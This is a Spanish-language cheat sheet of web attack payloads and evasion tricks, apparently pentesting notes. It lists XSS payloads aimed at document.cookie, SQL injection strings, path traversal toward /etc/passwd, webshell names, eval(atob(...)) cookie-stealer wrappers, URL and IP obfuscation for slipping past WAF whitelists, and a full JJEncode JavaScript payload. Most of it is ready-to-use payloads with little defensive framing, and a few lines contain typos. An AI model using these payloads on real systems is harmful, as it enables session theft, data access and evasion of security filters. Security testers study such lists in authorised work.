Reemplazos para funciones clásicas y ofuscación:

#######XSS:

### alert('xss')/alert(1):
prompt('xss')
prompt(8)
confirm('xss')
confirm(8)
alert(/xss/.source/)
window[/alert/.source](8)

### alert(document.cookie)
with(document)alert(cookie)
alert(document['cookie'])
alert(document[/cookie/.source])
alert(document[/coo/.source+/kie/.source])

### <img src=x onerror=alert(1);>
<svg/onload=alert(1)>
<video src=x onerror=alert(1);>
<audio src=x onerror=alert(1);>

##javascript:alert(document.cookie)
data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTjyk8L3NjcmlwdD4=

##########Blind SQLI
### ' or 1=1

'or 6=6
'or 0x47=0x47
or char(32)=''
or 6 is not null

### Union select
UNION ALL SELECT

############/etc/passwd
/too/../etc/far/passwd
/etc//passwd
/etc/ignore/..passwd
/etc/passwd.......

############webshell 

## c99.php/r57.php/shell.aspx/cmd.jsp/CmdAsp.asp

augh.php


################################Base64 evasion

####Cookie stealer
eval(atob("base64 full payload"))
[].constructor.constructor("codigo en base64")()
setTiemout(atob("code base64"()
setInterval(atob("code base64"))
setImmediate(atob("code base64))
Function(atob("code base64"))()


###############################URI ofuscation
URI=Uniform Resource Identifier.
###URI shortening:
http://yourls.org/

#####URL AUTHORITY OBFUSCATION:
Las URL son compuestas por varias partes/secciones ver imagen (URL authority)

Podemos pasar filtros simulando un envío de credenciales(userinfo) a una página que no utiliza autenticación ej:
https://www.google.com@hack.me/t/xss
Usamos el espacio de credenciales para pasar una página que se encuentra en el whitelist con el fin de que al leerla el WAF o filtro la deje
pasar, llevándonos a hack.me que, al no requerir credenciales, ignora la primer parte.

Podemos también agregar caracteres UNICODE en el userinfo ya que en este segmento de la URL son aceptados.

#####OFUSCAMIENTO DE HOST:

##Dword(Double Word):vuelve las ip un número tipo integer de 16 bists. ej:
216.58.215.78 == http://3627734862 

##Octal:
Podemos traducir una ip a octal(base8), encodeando cada octeto.
http://octeto1enoctal.octeto2enoctal.octeto3enoctal.octeto4enoctal
A este caso podemos agregarle ceros a la izquierda a cada número.

##HEXADECIMAL(base16)
Puede convertirse la ip a hexadecimal completamente o dividir cada número:
http://0xd83ad74e  o http://0xd8.0x3a.0xd7.0x4e
A esta opción también podemos agregarle ceros a la izquierda a cualquier octeto luego del "0x"

Podemos mezclar todas estas técnicas.

tool:
http://www.silisoftware.com/tools/ipconverter.php



#################JAVASCRIPT OBFUSCATION TECHNIQUES

#######NON-ALPHANUMERIC
La naturaleza de JS nos permite trabajar construyendo caracteres en base a signos:
alert(solo la palabra) = $=~[];$={___:++$,$$$$:(![]+"")[$],__$:++$,$_$_:(![]+"")[$],_$_:++$,$_$$:({}+"")[$],$$_$:($[$]+"")[$],_$$:++$,$$$_:(!""+"")[$],$__:++$,$_$:++$,$$__:({}+"")[$],$$_:++$,$$$:++$,$___:++$,$__$:++$};$.$_=($.$_=$+"")[$.$_$]+($._$=$.$_[$.__$])+($.$$=($.$+"")[$.__$])+((!$)+"")[$._$$]+($.__=$.$_[$.$$_])+($.$=(!""+"")[$.__$])+($._=(!""+"")[$._$_])+$.$_[$.$_$]+$.__+$._$+$.$;$.$$=$.$+(!""+"")[$._$$]+$.__+$._+$.$+$.$$;$.$=($.___)[$.$_][$.$_];$.$($.$($.$$+"\""+$.$_$_+(![]+"")[$._$_]+$.$$$_+"\\"+$.__$+$.$$_+$._$_+$.__+"\"")())();
tools:
http://utf-8.jp/public/jjencode.html
http://utf-8.jp/public/aaencode.html
http://www.jsfuck.com/

#######Compressing:
Para mejorar su rendimiento los programadores usan herramientas para compilar el código JS. Usando este criterio también podemos
ofuscar el código y evadir sistemas de defensa.

###MINIFYING
Remover todos los caracteres extras sin cambiar la funcionalidad.
tools:
https://developers.google.com/closure/compiler/
http://yui.github.io/yuicompressor/
http://crockford.com/javascript/jsmin

###PACKING
Comprime el código minificado haciendolo ilegible.

http://dean.edwards.name/packer/


#####################PHP Obfuscation techniques:

##Numerical data types:
Al igual que en JS podemos utilizar encodeados como octal, hexadecimal, decimal y binario(este último desde PHP 5.4.0)
Podemos recorrer un array utilizando los encodings y entre otras formas:
$x='giuseppe';
echo $x[0];    ///Decimal index     'G' 
echo $x[0001]; ///octal index       'i'
echo $x[0x02]; ///hexadecimal index 'u'
echo $x[0b11]; ///Binario index     's'




